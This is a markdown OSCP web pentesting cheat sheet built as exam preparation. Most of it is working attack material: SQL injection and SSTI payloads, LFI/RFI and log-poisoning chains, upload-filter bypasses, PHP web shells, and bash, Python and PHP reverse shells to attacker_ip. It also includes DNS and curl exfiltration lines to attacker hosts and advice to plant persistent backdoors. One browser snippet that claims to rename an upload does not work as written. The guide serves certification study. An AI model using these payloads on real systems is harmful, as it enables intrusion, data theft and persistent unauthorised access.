# OSCP Web Application Penetration Testing Gamebook
## Complete Guide with Scenarios, Tools, Commands, and Best Practices

### Table of Contents
1. [Introduction](#introduction)
2. [Web Application Attack Methodology](#methodology)
3. [Core Attack Scenarios](#scenarios)
4. [Essential Tools and Commands](#tools)
5. [Common Mistakes and How to Avoid Them](#mistakes)
6. [Advanced Techniques](#advanced)
7. [Practical Examples](#examples)
8. [Exam-Specific Tips](#exam-tips)
9. [References and Further Reading](#references)

---

## Introduction {#introduction}

This comprehensive gamebook covers all possible web application scenarios you may encounter during the OSCP exam. Based on extensive research from Reddit, CSDN, Medium, YouTube, and GitHub sources in English, Chinese, and Hindi, this guide provides practical, exam-focused content.

**Key Principles for OSCP Web Application Testing:**
- Manual techniques are paramount (automated tools are restricted)
- Enumeration is 90% of success
- Always establish persistence after initial foothold
- Document everything with screenshots and commands
- Time management is critical during the 24-hour exam

---

## Web Application Attack Methodology {#methodology}

### Phase 1: Information Gathering and Reconnaissance

#### 1.1 Initial Web Discovery
```bash
# Port scanning for web services
nmap -sV -sC -p 80,443,8080,8443,8000,8888,8800,8088,8880 target_ip

# HTTP service enumeration
nmap --script http-enum,http-title,http-methods,http-headers target_ip

# Technology identification
whatweb http://target_ip
curl -I http://target_ip
```

#### 1.2 Directory and File Enumeration
```bash
# Comprehensive directory busting
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,zip,bak

# Recursive enumeration
feroxbuster -u http://target_ip -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -d 3

# File enumeration with multiple extensions
ffuf -u http://target_ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.txt,.html,.js,.zip,.bak
```

#### 1.3 Technology Stack Analysis
```bash
# CMS identification
wpscan --url http://target_ip --enumerate u,t,p # WordPress
droopescan scan drupal -u http://target_ip # Drupal
joomscan -u http://target_ip # Joomla

# Framework detection
nikto -h http://target_ip
nmap --script http-enum target_ip
```

### Phase 2: Vulnerability Assessment

#### 2.1 Manual Testing Approach
1. **Parameter Discovery**: Identify all input parameters
2. **Input Validation Testing**: Test each parameter for injection flaws
3. **Authentication Testing**: Test login mechanisms and session management
4. **Authorization Testing**: Check for access control bypasses
5. **Business Logic Testing**: Understand application workflow

#### 2.2 Systematic Testing Methodology
```
For each discovered endpoint:
1. Identify parameter injection points
2. Test for SQL injection
3. Test for command injection
4. Test for file inclusion vulnerabilities
5. Test for file upload bypasses
6. Check for directory traversal
7. Analyze session management
8. Test business logic flows
```

---

## Core Attack Scenarios {#scenarios}

### Scenario 1: SQL Injection

#### 1.1 Error-Based SQL Injection
**Reconnaissance Commands:**
```bash
# Test for SQL injection points
curl "http://target_ip/login.php?id=1'" 
curl "http://target_ip/search.php?q=test'" 
```

**Manual Testing Payloads:**
```sql
# Basic error-based detection
' OR 1=1--
' OR 'a'='a
' AND 1=1--
' AND 1=2--

# Union-based enumeration
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT @@version,database(),user()--
```

**Advanced Manual Exploitation:**
```sql
# Database enumeration
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Data extraction
' UNION SELECT username,password FROM users--
' UNION SELECT load_file('/etc/passwd')--

# File writing (if permissions allow)
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
```

#### 1.2 Blind SQL Injection
**Boolean-Based Testing:**
```sql
# Time-based blind injection
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual WHERE database()='target_db')--

# Boolean-based blind injection
' AND (SELECT SUBSTRING(database(),1,1)='t')--
' AND LENGTH(database())=8--
```

**Common Mistakes to Avoid:**
- Not testing all parameters (GET, POST, Headers, Cookies)
- Relying solely on automated tools
- Missing blind injection opportunities
- Not properly encoding payloads
- Insufficient manual enumeration

### Scenario 2: Local File Inclusion (LFI)

#### 2.1 Basic LFI Testing
**Detection Payloads:**
```bash
# Linux targets
http://target_ip/page.php?file=../../../etc/passwd
http://target_ip/page.php?file=....//....//....//etc/passwd
http://target_ip/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Windows targets
http://target_ip/page.php?file=../../../windows/system32/drivers/etc/hosts
http://target_ip/page.php?file=C:\windows\system32\drivers\etc\hosts
```

#### 2.2 Advanced LFI Techniques
**PHP Wrapper Exploitation:**
```bash
# PHP filter wrapper
http://target_ip/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://target_ip/page.php?file=php://filter/read=string.rot13/resource=index.php

# Data wrapper RCE
http://target_ip/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=whoami

# Expect wrapper (if enabled)
http://target_ip/page.php?file=expect://whoami
```

#### 2.3 Log Poisoning Techniques
**Apache Log Poisoning:**
```bash
# Poison User-Agent in access logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target_ip/

# Include poisoned log file
http://target_ip/page.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

**SSH Log Poisoning:**
```bash
# Attempt SSH connection with PHP payload as username
ssh "<?php system(\$_GET['cmd']); ?>"@target_ip

# Include auth.log
http://target_ip/page.php?file=../../../var/log/auth.log&cmd=id
```

### Scenario 3: Remote File Inclusion (RFI)

#### 3.1 RFI Detection and Exploitation
**Basic RFI Testing:**
```bash
# Host malicious file on attacker machine
echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
python3 -m http.server 8000

# Include remote file
http://target_ip/page.php?file=http://attacker_ip:8000/shell.txt&cmd=whoami
```

**Advanced RFI Techniques:**
```bash
# Using data:// protocol
http://target_ip/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=id

# Using ftp:// protocol
http://target_ip/page.php?file=ftp://attacker_ip/shell.txt&cmd=ls
```

### Scenario 4: File Upload Vulnerabilities

#### 4.1 Client-Side Bypass Techniques
**Frontend Restriction Bypass:**
```javascript
// Modify file extension after selection
document.querySelector('input[type="file"]').files[0].name = "shell.php.jpg"

// Remove client-side validation
// Delete JavaScript validation functions in browser console
```

#### 4.2 Server-Side Filter Bypasses

**Extension-Based Bypasses:**
```bash
# Alternative PHP extensions
shell.php3, shell.php4, shell.php5, shell.phtml, shell.inc

# Double extensions
shell.php.jpg, shell.jpg.php

# Case manipulation
shell.PhP, shell.pHp, shell.PHP

# Null byte injection (older systems)
shell.php%00.jpg, shell.php\x00.jpg
```

**MIME Type Bypasses:**
```bash
# Change Content-Type in request
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

**Magic Bytes Insertion:**
```bash
# Add GIF header to PHP shell
echo -e "GIF89a;\n<?php system(\$_GET['cmd']); ?>" > shell.gif

# Add PNG magic bytes
echo -ne "\x89PNG\r\n\x1a\n" > shell.png
echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
```

#### 4.3 Advanced Upload Bypasses

**ExifTool Technique:**
```bash
# Embed PHP code in EXIF data
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg
mv image.jpg image.php.jpg
```

**ZIP Upload Exploitation:**
```bash
# Create malicious ZIP file
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip shell.zip shell.php

# If ZIP extraction occurs, access extracted file
http://target_ip/uploads/shell.php?cmd=whoami
```

**HTAccess Upload:**
```bash
# Upload .htaccess file to enable PHP execution
echo -e "AddHandler application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .png" > .htaccess

# Upload image with PHP code
echo "<?php system(\$_GET['cmd']); ?>" > shell.jpg
```

### Scenario 5: Command Injection

#### 5.1 Command Injection Discovery
**Testing Command Separators:**
```bash
# Different command separators
; whoami
| whoami  
& whoami
&& whoami
|| whoami
`whoami`
$(whoami)
```

**Encoding Bypasses:**
```bash
# URL encoding
%3B%20whoami
%7C%20whoami
%26%20whoami

# Double URL encoding
%253B%2520whoami
```

#### 5.2 Advanced Command Injection

**Blind Command Injection:**
```bash
# Time-based detection
; sleep 10
; ping -c 5 127.0.0.1

# Out-of-band detection
; ping attacker_ip
; curl http://attacker_ip/$(whoami)
; nslookup $(whoami).attacker_domain
```

**Filter Bypasses:**
```bash
# Space bypasses
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Command substitution
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Scenario 6: Authentication and Session Bypasses

#### 6.1 SQL Injection Authentication Bypass
```sql
# Login form bypasses
admin'--
admin'/*
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin' OR '1'='1'--
```

#### 6.2 Session Management Attacks
**Session Fixation:**
```bash
# Set session ID before authentication
curl -b "PHPSESSID=attacker_controlled_session" http://target_ip/login
```

**Session Prediction:**
```bash
# Analyze session token patterns
for i in {1..10}; do
    curl -c cookies_$i.txt http://target_ip/login
    grep PHPSESSID cookies_$i.txt
done
```

### Scenario 7: Directory Traversal

#### 7.1 Basic Directory Traversal
```bash
# Standard payloads
../../../etc/passwd
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts

# Encoded payloads
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
..%252f..%252f..%252fetc%252fpasswd

# Unicode bypasses
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

#### 7.2 Advanced Traversal Techniques
```bash
# Bypass filename restrictions
....//....//....//etc/passwd
..././..././..././etc/passwd

# Absolute path attempts
/etc/passwd
C:\windows\system32\drivers\etc\hosts
file:///etc/passwd
```

---

## Essential Tools and Commands {#tools}

### Primary Tools for OSCP Web Testing

#### Burp Suite (Essential)
```bash
# Key Burp Suite features for OSCP:
- Proxy intercept and modify requests
- Repeater for payload testing
- Intruder for parameter brute forcing
- Target site map generation
- Extension integration (not Burp Pro features)
```

#### Command Line Tools
```bash
# cURL - HTTP client for manual testing
curl -X POST -d "param=value" http://target_ip/endpoint
curl -H "X-Forwarded-For: 127.0.0.1" http://target_ip
curl -b "PHPSESSID=test" http://target_ip
curl -A "<?php system(\$_GET['cmd']); ?>" http://target_ip

# Netcat - Network utility
nc -lvnp 4444  # Reverse shell listener
nc target_ip 80  # Banner grabbing

# Python HTTP server - Host payloads
python3 -m http.server 8000
```

#### Directory Enumeration Tools
```bash
# Gobuster
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,zip,bak,old

# FFuf
ffuf -u http://target_ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Feroxbuster (recursive enumeration)
feroxbuster -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 3 -t 50
```

### Web Shell Templates

#### PHP Web Shells
```php
# Simple command shell
<?php system($_GET['cmd']); ?>

# More advanced shell
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

# Upload-friendly shell
GIF89a;
<?php system($_GET['cmd']); ?>
```

#### Reverse Shell Payloads
```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Common Mistakes and How to Avoid Them {#mistakes}

### Top 10 OSCP Web Application Mistakes

#### 1. Insufficient Enumeration
**Mistake:** Not thoroughly enumerating all web directories and files
**Solution:** 
- Use multiple wordlists
- Try different file extensions
- Perform recursive enumeration
- Check for backup files (.bak, .old, ~)

#### 2. Over-reliance on Automated Tools
**Mistake:** Using sqlmap or other restricted tools
**Solution:**
- Master manual SQL injection techniques
- Learn to craft payloads manually
- Understand the underlying vulnerabilities

#### 3. Missing Parameter Testing
**Mistake:** Not testing all input parameters
**Solution:**
- Test GET, POST, Cookie, and Header parameters
- Use Burp Suite to identify all parameters
- Test each parameter individually

#### 4. Improper Shell Establishment
**Mistake:** Getting a shell but not maintaining access
**Solution:**
- Establish multiple access methods
- Create persistent backdoors
- Document all access methods

#### 5. Poor Time Management
**Mistake:** Spending too much time on one vulnerability
**Solution:**
- Set time limits for each testing phase
- Move on if stuck after reasonable time
- Return to difficult targets after completing easier ones

#### 6. Inadequate Documentation
**Mistake:** Not properly documenting exploitation steps
**Solution:**
- Screenshot every step
- Record all commands used
- Note all successful payloads
- Maintain detailed notes

#### 7. Missing Privilege Escalation
**Mistake:** Getting initial access but not escalating privileges
**Solution:**
- Always attempt privilege escalation
- Enumerate system thoroughly after initial access
- Try multiple escalation vectors

#### 8. Ignoring Edge Cases
**Mistake:** Not testing different scenarios and edge cases
**Solution:**
- Test different file types for uploads
- Try various encoding methods
- Test both Linux and Windows payloads

#### 9. Poor Payload Crafting
**Mistake:** Using incorrect payload formats or encoding
**Solution:**
- Understand different encoding methods
- Test payload variations
- Verify payload execution

#### 10. Missing Business Logic Flaws
**Mistake:** Focusing only on technical vulnerabilities
**Solution:**
- Understand application workflow
- Test business logic assumptions
- Look for workflow bypasses

---

## Advanced Techniques {#advanced}

### Advanced SQL Injection Techniques

#### Second-Order SQL Injection
```sql
# Register user with malicious payload in username
username: admin'--
password: anything

# Login triggers the injection in different context
SELECT * FROM users WHERE username = 'admin'--' AND password = 'hash'
```

#### WAF Bypass Techniques
```sql
# Comment variation bypasses
/**/ instead of spaces
/*comment*/SELECT/*comment*/
/*!50000SELECT*/

# Case variation
SeLeCt, UnIoN, WhErE

# Encoding bypasses
CHAR(65,68,77,73,78) instead of 'ADMIN'
HEX encoding: 0x41444D494E
```

### Advanced File Upload Bypasses

#### Polyglot File Creation
```bash
# Create file that's both valid image and PHP
echo -ne "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00C\x00" > polyglot.jpg
echo "<?php system(\$_GET['cmd']); ?>" >> polyglot.jpg
```

#### Server-Side Template Injection (SSTI)
```python
# Template injection payloads
{{7*7}}  # Jinja2
${7*7}   # Freemarker
#{7*7}   # JSF

# Command execution via SSTI
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

### Advanced Command Injection

#### Environment Variable Exploitation
```bash
# Using environment variables for bypass
$(echo $PATH | cut -d: -f1)/whoami
${PATH:0:8}/whoami

# Process substitution
cat <(whoami)
```

#### Blind Command Injection with DNS
```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(id | base64).attacker.com
```

---

## Practical Examples {#examples}

### Example 1: Complete Web Application Compromise

**Target:** Blog application with admin panel

**Step 1: Reconnaissance**
```bash
# Initial scan
nmap -sV -sC target_ip

# Web technology enumeration
whatweb http://target_ip
nikto -h http://target_ip

# Directory enumeration
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Step 2: Vulnerability Discovery**
```bash
# Found admin panel at /admin/
# SQL injection in login form
curl -d "username=admin'--&password=anything" http://target_ip/admin/login.php
```

**Step 3: Exploitation**
```sql
# Authentication bypass
username: admin'--
password: anything

# Post-authentication SQL injection in search
search=test' UNION SELECT load_file('/etc/passwd')--
```

**Step 4: File Upload Abuse**
```php
# Upload PHP shell via admin panel
<?php system($_GET['cmd']); ?>
# Saved as: shell.php.gif with Content-Type: image/gif
```

**Step 5: Shell Access**
```bash
# Access uploaded shell
curl "http://target_ip/uploads/shell.php.gif?cmd=whoami"

# Establish reverse shell
curl "http://target_ip/uploads/shell.php.gif?cmd=bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
```

### Example 2: LFI to RCE Chain

**Target:** File management application

**Step 1: LFI Discovery**
```bash
# Parameter fuzzing reveals file parameter
curl "http://target_ip/view.php?file=../../../etc/passwd"
```

**Step 2: Log Poisoning**
```bash
# Poison Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target_ip/

# Include poisoned log
curl "http://target_ip/view.php?file=../../../var/log/apache2/access.log&cmd=whoami"
```

**Step 3: RCE Achievement**
```bash
# Command execution achieved
curl "http://target_ip/view.php?file=../../../var/log/apache2/access.log&cmd=id"
```

---

## Exam-Specific Tips {#exam-tips}

### Time Management Strategy

**Hour 0-2: Initial Enumeration**
- Quick port scan all targets
- Identify web services
- Start directory enumeration on all web services

**Hour 2-8: Primary Exploitation**
- Focus on easier targets first
- Document all findings
- Establish initial footholds

**Hour 8-16: Privilege Escalation**
- Escalate privileges on compromised systems
- Attempt lateral movement if applicable
- Complete documentation

**Hour 16-20: Difficult Targets**
- Focus on remaining targets
- Try alternative approaches
- Don't get stuck on single vulnerability

**Hour 20-23: Final Push and Documentation**
- Complete all possible exploitations
- Finalize documentation
- Prepare report

### Documentation Requirements

**For Each Vulnerability:**
1. Screenshot of vulnerability discovery
2. Exact commands/payloads used
3. Screenshot of successful exploitation
4. Screenshot of proof (user.txt/root.txt)
5. Remediation recommendations

**Report Structure:**
1. Executive Summary
2. Methodology
3. Detailed Findings
4. Screenshots and Evidence
5. Recommendations
6. Appendices

### Exam Environment Considerations

**Allowed Tools:**
- Burp Suite Free (not Pro)
- Manual enumeration tools
- Standard penetration testing tools
- Custom scripts (no automation)

**Restricted Items:**
- SQLmap (automated exploitation)
- Commercial vulnerability scanners
- Metasploit (limited use - one machine only)
- Any fully automated exploitation tools

---

## References and Further Reading {#references}

### Essential Resources

1. **OWASP Testing Guide** - Comprehensive web application testing methodology
2. **PortSwigger Web Security Academy** - Free web security training labs
3. **OWASP Top 10** - Most critical web application security risks
4. **PEN-200 Course Material** - Official OSCP training content

### Practice Platforms

1. **HackTheBox** - Web-focused machines for practice
2. **TryHackMe** - Web application security rooms
3. **PortSwigger Labs** - Specific vulnerability practice
4. **DVWA** - Deliberately vulnerable web application
5. **WebGoat** - Interactive security education

### Command References

1. **PayloadsAllTheThings** - Comprehensive payload collection
2. **OSCP Cheat Sheets** - Quick reference guides
3. **Burp Suite Documentation** - Tool-specific guidance
4. **Web Application Hacker's Handbook** - In-depth methodology

### Community Resources

1. **r/oscp subreddit** - Community discussions and tips
2. **OSCP Discord servers** - Real-time help and discussion
3. **InfoSec Twitter community** - Latest techniques and tools
4. **YouTube walkthrough channels** - Video explanations

---

**Final Notes:**

This gamebook represents a comprehensive compilation of OSCP web application testing scenarios based on extensive research across multiple languages and platforms. The techniques, tools, and methodologies presented here are designed specifically for the OSCP exam environment and ethical penetration testing.

Remember the OSCP motto: **"Try Harder"** - persistence and thorough enumeration are key to success. Always approach each target systematically, document everything, and never give up on seemingly impossible challenges.

Good luck with your OSCP journey!